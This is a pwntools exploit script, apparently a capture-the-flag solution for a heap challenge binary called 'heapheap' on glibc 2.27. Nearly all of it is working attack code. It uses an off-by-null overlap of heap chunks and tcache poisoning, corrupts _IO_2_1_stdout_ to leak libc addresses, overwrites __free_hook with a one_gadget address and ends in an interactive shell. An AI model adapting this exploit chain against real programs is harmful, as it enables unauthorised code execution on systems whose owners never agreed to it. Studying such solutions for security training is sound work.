#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

elf = ELF('./heapheap')
libc = ELF('./libc-2.27-1.6.so')
p = process('./heapheap')

def pr(a,addr):
	log.success(a+': '+hex(addr))

def add(length,data):
	p.sendlineafter('Please input your choice: ','1')
	p.sendlineafter('Please input the size:',str(length))
	p.sendafter('Data:',data)
	
def delete(idx):
	p.sendlineafter('Please input your choice: ','2')
	p.sendlineafter('Please input the index:',str(idx))
	p.recvuntil('deleted')	

#hp 0x2020c0
## unlink header
add(0x4f8, "chunk0") #idx0 chunk0 250
add(0x88, "chunk1") #idx1 chunk1 750
add(0xf8, "chunk2") #idx2 chunk2 7e0
add(0x58, "chunk3") #idx3 chunk3 8e0
add(0x4f8, "chunk4") #idx4 chunk4 940
add(0x20, 'ccc') #idx5 chunk5 e40

# gdb.attach(p)
# pause()
delete(0) # 放入 unsortedbin
delete(3) # 放入 tcachebin

add(0x58,'A'*0x50+p64(0x500+0x90+0x100+0x60)) #idx0 use chunk3, off by null，修改 chunk4 的 size 位
delete(4) #向上合并堆块,这样就控制了chunk1 01234

delete(1)
# gdb.attach(p)
# pause()
add(0x4f0,'idx1') #idx1 use chunk0

add(0x10,'\x60\xc7') #idx3
add(0x80, "idx4") #idx4 chunk1

# gdb.attach(p)
# pause()
payload = p64(0xfbad1800) + p64(0)*3 + b"\n"
add(0x80, payload) #idx6 分配去_IO_2_1_stdout_

p.recvuntil("\xff"*8)
libcbase = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 0x3eb780
system = libcbase + libc.sym['system']
free_hook = libcbase + libc.sym['__free_hook']

one_gadget = [0x4f3d5,0x4f432,0x10a41c] #1.4
one_gadget1 = [0x4f2a5,0x4f302,0x10a2fc] #1.6
pr("libcbase",libcbase)
pr('system',system)
pr('free_hook',free_hook)

# gdb.attach(p)
# pause()

delete(2)
add(0x60,'/bin/sh\x00') #idx2

payload1 = p64(free_hook)
add(0x10,payload1) #idx7

add(0xf0,"idx8") #idx8
add(0xf0, p64(one_gadget1[1]+libcbase)) #idx9

# gdb.attach(p)
# pause()

p.sendlineafter('Please input your choice: ','2')
p.sendlineafter('Please input the index:','2')

p.interactive()
